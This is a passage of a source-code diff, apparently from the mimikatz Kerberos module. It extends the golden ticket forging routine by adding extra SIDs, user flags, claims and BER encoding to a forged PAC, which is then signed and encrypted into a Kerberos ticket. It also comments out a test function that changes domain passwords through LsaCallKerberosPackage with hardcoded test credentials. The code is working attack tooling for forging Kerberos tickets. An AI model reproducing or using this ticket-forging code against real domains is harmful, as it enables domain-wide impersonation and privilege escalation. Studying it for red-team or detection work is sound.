 	KIWI_NEVERTIME(&validationInfo.PasswordCanChange);
 	KIWI_NEVERTIME(&validationInfo.PasswordMustChange);
-	RtlInitUnicodeString(&validationInfo.LogonDomainName, L"eo.oe.kiwi :)");
+	RtlInitUnicodeString(&validationInfo.LogonDomainName, LogonDomainName);
 
 	validationInfo.EffectiveName		= ticket.ClientName->Names[0];
 	validationInfo.LogonDomainId		= sid;
@@ -544,6 +717,17 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 
 	validationInfo.GroupCount = cbGroups;
 	validationInfo.GroupIds = groups;
+	validationInfo.SidCount = cbSids;
+	validationInfo.ExtraSids = sids;
+
+	validationInfo.ResourceGroupDomainSid = NULL;
+	validationInfo.ResourceGroupCount = 0;
+	validationInfo.ResourceGroupIds = NULL;
+
+	if(validationInfo.ExtraSids && validationInfo.SidCount)
+		validationInfo.UserFlags |= 0x20;
+	if(validationInfo.ResourceGroupDomainSid && validationInfo.ResourceGroupIds && validationInfo.ResourceGroupCount)
+		validationInfo.UserFlags |= 0x200;
 
 	switch(keyType)
 	{
@@ -561,25 +745,25 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 		SignatureType = KERB_CHECKSUM_HMAC_MD5;
 	}
 	
-	if(kuhl_m_pac_validationInfo_to_PAC(&validationInfo, SignatureType, &pacType, &pacTypeSize))
+	if(kuhl_m_pac_validationInfo_to_PAC(&validationInfo, SignatureType, pClaimsSet, &pacType, &pacTypeSize))
 	{
 		kprintf(L" * PAC generated\n");
 		status = kuhl_m_pac_signature(pacType, pacTypeSize, SignatureType, key, keySize);
 		if(NT_SUCCESS(status))
 		{
 			kprintf(L" * PAC signed\n");
-			if(App_EncTicketPart = kuhl_m_kerberos_ticket_createAppEncTicketPart(&ticket, pacType, pacTypeSize))
+			if(BerApp_EncTicketPart = kuhl_m_kerberos_ticket_createAppEncTicketPart(&ticket, pacType, pacTypeSize))
 			{
 				kprintf(L" * EncTicketPart generated\n");
-				status = kuhl_m_kerberos_encrypt(keyType, KRB_KEY_USAGE_AS_REP_TGS_REP, key, keySize, App_EncTicketPart, kull_m_asn1_getSize(App_EncTicketPart), (LPVOID *) &ticket.Ticket.Value, &ticket.Ticket.Length, TRUE);	
+				status = kuhl_m_kerberos_encrypt(keyType, KRB_KEY_USAGE_AS_REP_TGS_REP, key, keySize, BerApp_EncTicketPart->bv_val, BerApp_EncTicketPart->bv_len, (LPVOID *) &ticket.Ticket.Value, &ticket.Ticket.Length, TRUE);	
 				if(NT_SUCCESS(status))
 				{
 					kprintf(L" * EncTicketPart encrypted\n");
-					if(App_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(&ticket, FALSE))
+					if(BerApp_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(&ticket, FALSE))
 						kprintf(L" * KrbCred generated\n");
 				}
 				else PRINT_ERROR(L"kuhl_m_kerberos_encrypt %08x\n", status);
-				LocalFree(App_EncTicketPart);
+				ber_bvfree(BerApp_EncTicketPart);
 			}
 		}
 		LocalFree(pacType);
@@ -594,7 +778,7 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 	if(ticket.ServiceName)
 		LocalFree(ticket.ServiceName);
 
-	return App_KrbCred;
+	return BerApp_KrbCred;
 }
 
 NTSTATUS kuhl_m_kerberos_hash_data(LONG keyType, PCUNICODE_STRING pString, PCUNICODE_STRING pSalt, DWORD count)
@@ -673,7 +857,7 @@ NTSTATUS kuhl_m_kerberos_decode(int argc, wchar_t * argv[])
 {
 	NTSTATUS status;
 	BYTE key[AES_256_KEY_LENGTH]; // max len
-	PCWCHAR szKey, szIn, szOut, szOffset, szSize;
+	PCWCHAR szKey = NULL, szIn, szOut, szOffset, szSize;
 	PBYTE encData, decData;
 	DWORD keyType, keyLen, encSize, decSize, offset = 0, size = 0;
 
@@ -735,103 +919,103 @@ NTSTATUS kuhl_m_kerberos_decode(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-NTSTATUS kuhl_m_kerberos_test(int argc, wchar_t * argv[])
-{
-	NTSTATUS status, packageStatus;
-	
-	KERB_CHANGEPASSWORD_REQUEST kerbChangePasswordRequest;
-	PBYTE kerbChangePasswordRequestBuffer;
-
-	DWORD size, responseSize = 1024, offset = sizeof(KERB_CHANGEPASSWORD_REQUEST);
-	BYTE dumPtr[1024];
-
-	RtlZeroMemory(&kerbChangePasswordRequest, sizeof(KERB_CHANGEPASSWORD_REQUEST));
-
-	kerbChangePasswordRequest.MessageType = KerbChangePasswordMessage;
-	RtlInitUnicodeString(&kerbChangePasswordRequest.DomainName, L"chocolate.local");
-	RtlInitUnicodeString(&kerbChangePasswordRequest.AccountName, L"testme");
-	RtlInitUnicodeString(&kerbChangePasswordRequest.OldPassword, L"---");
-	RtlInitUnicodeString(&kerbChangePasswordRequest.NewPassword, L"t4waza1234/");
-	kerbChangePasswordRequest.Impersonating = FALSE;
-
-	size = kerbChangePasswordRequest.DomainName.Length + kerbChangePasswordRequest.AccountName.Length + kerbChangePasswordRequest.OldPassword.Length + kerbChangePasswordRequest.NewPassword.Length;
-	if(kerbChangePasswordRequestBuffer = (PBYTE) LocalAlloc(LPTR, offset + size))
-	{
-		RtlCopyMemory(kerbChangePasswordRequestBuffer + offset, kerbChangePasswordRequest.DomainName.Buffer, kerbChangePasswordRequest.DomainName.Length);
-		kerbChangePasswordRequest.DomainName.Buffer = (PWCHAR) offset;
-		offset += kerbChangePasswordRequest.DomainName.Length;
-
-		RtlCopyMemory(kerbChangePasswordRequestBuffer + offset, kerbChangePasswordRequest.AccountName.Buffer, kerbChangePasswordRequest.AccountName.Length);
-		kerbChangePasswordRequest.AccountName.Buffer = (PWCHAR) offset;
-		offset += kerbChangePasswordRequest.AccountName.Length;
-
-		RtlCopyMemory(kerbChangePasswordRequestBuffer + offset, kerbChangePasswordRequest.OldPassword.Buffer, kerbChangePasswordRequest.OldPassword.Length);
-		kerbChangePasswordRequest.OldPassword.Buffer = (PWCHAR) offset;
-		offset += kerbChangePasswordRequest.OldPassword.Length;
-
-		RtlCopyMemory(kerbChangePasswordRequestBuffer + offset, kerbChangePasswordRequest.NewPassword.Buffer, kerbChangePasswordRequest.NewPassword.Length);
-		kerbChangePasswordRequest.NewPassword.Buffer = (PWCHAR) offset;
-		offset += kerbChangePasswordRequest.NewPassword.Length;
-
-
-		RtlCopyMemory(kerbChangePasswordRequestBuffer, &kerbChangePasswordRequest, sizeof(KERB_CHANGEPASSWORD_REQUEST));
-
-		status = LsaCallKerberosPackage(kerbChangePasswordRequestBuffer, sizeof(KERB_CHANGEPASSWORD_REQUEST) + size, (PVOID *)&dumPtr, &responseSize, &packageStatus);
-		if(NT_SUCCESS(status))
-		{
-			if(NT_SUCCESS(packageStatus))
-				kprintf(L"KerbChangePasswordMessage is OK\n");
-			else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbChangePasswordMessage / Package : %08x\n", packageStatus);
-		}
-		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbChangePasswordMessage : %08x\n", status);
-
-		LocalFree(kerbChangePasswordRequestBuffer);
-	}
-
-/*
-	KERB_SETPASSWORD_REQUEST kerbSetPasswordRequest;
-	PBYTE kerbSetPasswordRequestBuffer;
-
-	DWORD size, responseSize = 1024, offset = sizeof(KERB_SETPASSWORD_REQUEST);
-	BYTE dumPtr[1024];
-
-	RtlZeroMemory(&kerbSetPasswordRequest, sizeof(KERB_SETPASSWORD_REQUEST));
-	kerbSetPasswordRequest.MessageType = KerbSetPasswordMessage;
-	RtlInitUnicodeString(&kerbSetPasswordRequest.DomainName, L"chocolate.local");
-	RtlInitUnicodeString(&kerbSetPasswordRequest.AccountName, L"testme");
-	RtlInitUnicodeString(&kerbSetPasswordRequest.Password, L"t2waza1234/");
-
-
-	size = kerbSetPasswordRequest.DomainName.Length + kerbSetPasswordRequest.AccountName.Length + kerbSetPasswordRequest.Password.Length;
-	if(kerbSetPasswordRequestBuffer = (PBYTE) LocalAlloc(LPTR, offset + size))
-	{
-		RtlCopyMemory(kerbSetPasswordRequestBuffer + offset, kerbSetPasswordRequest.DomainName.Buffer, kerbSetPasswordRequest.DomainName.Length);
-		kerbSetPasswordRequest.DomainName.Buffer = (PWCHAR) offset;
-		offset += kerbSetPasswordRequest.DomainName.Length;
-
-		RtlCopyMemory(kerbSetPasswordRequestBuffer + offset, kerbSetPasswordRequest.AccountName.Buffer, kerbSetPasswordRequest.AccountName.Length);
-		kerbSetPasswordRequest.AccountName.Buffer = (PWCHAR) offset;
-		offset += kerbSetPasswordRequest.AccountName.Length;
-
-		RtlCopyMemory(kerbSetPasswordRequestBuffer + offset, kerbSetPasswordRequest.Password.Buffer, kerbSetPasswordRequest.Password.Length);
-		kerbSetPasswordRequest.Password.Buffer = (PWCHAR) offset;
-		offset += kerbSetPasswordRequest.Password.Length;
-
-		RtlCopyMemory(kerbSetPasswordRequestBuffer, &kerbSetPasswordRequest, sizeof(KERB_SETPASSWORD_REQUEST));
-
-		status = LsaCallKerberosPackage(kerbSetPasswordRequestBuffer, sizeof(KERB_SETPASSWORD_REQUEST) + size, (PVOID *)&dumPtr, &responseSize, &packageStatus);
-		if(NT_SUCCESS(status))
-		{
-			if(NT_SUCCESS(packageStatus))
-				kprintf(L"kerbSetPasswordRequest is OK\n");
-			else PRINT_ERROR(L"LsaCallAuthenticationPackage kerbSetPasswordRequest / Package : %08x\n", packageStatus);
-		}
-		else PRINT_ERROR(L"LsaCallAuthenticationPackage kerbSetPasswordRequest : %08x\n", status);
-
-		LocalFree(kerbSetPasswordRequestBuffer);
-	}
-	*/
-
-	return STATUS_SUCCESS;
-}
+//NTSTATUS kuhl_m_kerberos_test(int argc, wchar_t * argv[])
+//{
+//	NTSTATUS status, packageStatus;
+//	
+//	KERB_CHANGEPASSWORD_REQUEST kerbChangePasswordRequest;
+//	PBYTE kerbChangePasswordRequestBuffer;
+//
+//	DWORD size, responseSize = 1024, offset = sizeof(KERB_CHANGEPASSWORD_REQUEST);
+//	BYTE dumPtr[1024];
+//
+//	RtlZeroMemory(&kerbChangePasswordRequest, sizeof(KERB_CHANGEPASSWORD_REQUEST));
+//
+//	kerbChangePasswordRequest.MessageType = KerbChangePasswordMessage;
+//	RtlInitUnicodeString(&kerbChangePasswordRequest.DomainName, L"chocolate.local");
+//	RtlInitUnicodeString(&kerbChangePasswordRequest.AccountName, L"testme");
+//	RtlInitUnicodeString(&kerbChangePasswordRequest.OldPassword, L"---");
+//	RtlInitUnicodeString(&kerbChangePasswordRequest.NewPassword, L"t4waza1234/");
+//	kerbChangePasswordRequest.Impersonating = FALSE;
+//
+//	size = kerbChangePasswordRequest.DomainName.Length + kerbChangePasswordRequest.AccountName.Length + kerbChangePasswordRequest.OldPassword.Length + kerbChangePasswordRequest.NewPassword.Length;
+//	if(kerbChangePasswordRequestBuffer = (PBYTE) LocalAlloc(LPTR, offset + size))
+//	{
+//		RtlCopyMemory(kerbChangePasswordRequestBuffer + offset, kerbChangePasswordRequest.DomainName.Buffer, kerbChangePasswordRequest.DomainName.Length);
+//		kerbChangePasswordRequest.DomainName.Buffer = (PWCHAR) offset;
+//		offset += kerbChangePasswordRequest.DomainName.Length;
+//
+//		RtlCopyMemory(kerbChangePasswordRequestBuffer + offset, kerbChangePasswordRequest.AccountName.Buffer, kerbChangePasswordRequest.AccountName.Length);
+//		kerbChangePasswordRequest.AccountName.Buffer = (PWCHAR) offset;
+//		offset += kerbChangePasswordRequest.AccountName.Length;
+//
+//		RtlCopyMemory(kerbChangePasswordRequestBuffer + offset, kerbChangePasswordRequest.OldPassword.Buffer, kerbChangePasswordRequest.OldPassword.Length);
+//		kerbChangePasswordRequest.OldPassword.Buffer = (PWCHAR) offset;
+//		offset += kerbChangePasswordRequest.OldPassword.Length;
+//
+//		RtlCopyMemory(kerbChangePasswordRequestBuffer + offset, kerbChangePasswordRequest.NewPassword.Buffer, kerbChangePasswordRequest.NewPassword.Length);
+//		kerbChangePasswordRequest.NewPassword.Buffer = (PWCHAR) offset;
+//		offset += kerbChangePasswordRequest.NewPassword.Length;
+//
+//
+//		RtlCopyMemory(kerbChangePasswordRequestBuffer, &kerbChangePasswordRequest, sizeof(KERB_CHANGEPASSWORD_REQUEST));
+//
+//		status = LsaCallKerberosPackage(kerbChangePasswordRequestBuffer, sizeof(KERB_CHANGEPASSWORD_REQUEST) + size, (PVOID *)&dumPtr, &responseSize, &packageStatus);
+//		if(NT_SUCCESS(status))
+//		{
+//			if(NT_SUCCESS(packageStatus))
+//				kprintf(L"KerbChangePasswordMessage is OK\n");
+//			else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbChangePasswordMessage / Package : %08x\n", packageStatus);
+//		}
+//		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbChangePasswordMessage : %08x\n", status);
+//
+//		LocalFree(kerbChangePasswordRequestBuffer);
+//	}
+//
+///*
+//	KERB_SETPASSWORD_REQUEST kerbSetPasswordRequest;
+//	PBYTE kerbSetPasswordRequestBuffer;
+//
+//	DWORD size, responseSize = 1024, offset = sizeof(KERB_SETPASSWORD_REQUEST);
+//	BYTE dumPtr[1024];
+//
+//	RtlZeroMemory(&kerbSetPasswordRequest, sizeof(KERB_SETPASSWORD_REQUEST));
+//	kerbSetPasswordRequest.MessageType = KerbSetPasswordMessage;
+//	RtlInitUnicodeString(&kerbSetPasswordRequest.DomainName, L"chocolate.local");
+//	RtlInitUnicodeString(&kerbSetPasswordRequest.AccountName, L"testme");
+//	RtlInitUnicodeString(&kerbSetPasswordRequest.Password, L"t2waza1234/");
+//
+//
+//	size = kerbSetPasswordRequest.DomainName.Length + kerbSetPasswordRequest.AccountName.Length + kerbSetPasswordRequest.Password.Length;
+//	if(kerbSetPasswordRequestBuffer = (PBYTE) LocalAlloc(LPTR, offset + size))
+//	{
+//		RtlCopyMemory(kerbSetPasswordRequestBuffer + offset, kerbSetPasswordRequest.DomainName.Buffer, kerbSetPasswordRequest.DomainName.Length);
+//		kerbSetPasswordRequest.DomainName.Buffer = (PWCHAR) offset;
+//		offset += kerbSetPasswordRequest.DomainName.Length;
+//
+//		RtlCopyMemory(kerbSetPasswordRequestBuffer + offset, kerbSetPasswordRequest.AccountName.Buffer, kerbSetPasswordRequest.AccountName.Length);
+//		kerbSetPasswordRequest.AccountName.Buffer = (PWCHAR) offset;
+//		offset += kerbSetPasswordRequest.AccountName.Length;
+//
+//		RtlCopyMemory(kerbSetPasswordRequestBuffer + offset, kerbSetPasswordRequest.Password.Buffer, kerbSetPasswordRequest.Password.Length);
+//		kerbSetPasswordRequest.Password.Buffer = (PWCHAR) offset;
+//		offset += kerbSetPasswordRequest.Password.Length;
+//
+//		RtlCopyMemory(kerbSetPasswordRequestBuffer, &kerbSetPasswordRequest, sizeof(KERB_SETPASSWORD_REQUEST));
+//
+//		status = LsaCallKerberosPackage(kerbSetPasswordRequestBuffer, sizeof(KERB_SETPASSWORD_REQUEST) + size, (PVOID *)&dumPtr, &responseSize, &packageStatus);
+//		if(NT_SUCCESS(status))
+//		{
+//			if(NT_SUCCESS(packageStatus))
+//				kprintf(L"kerbSetPasswordRequest is OK\n");
+//			else PRINT_ERROR(L"LsaCallAuthenticationPackage kerbSetPasswordRequest / Package : %08x\n", packageStatus);
+//		}
+//		else PRINT_ERROR(L"LsaCallAuthenticationPackage kerbSetPasswordRequest : %08x\n", status);
+//
+//		LocalFree(kerbSetPasswordRequestBuffer);
+//	}
+//	*/
+//
+//	return STATUS_SUCCESS;
+//}
 #endif
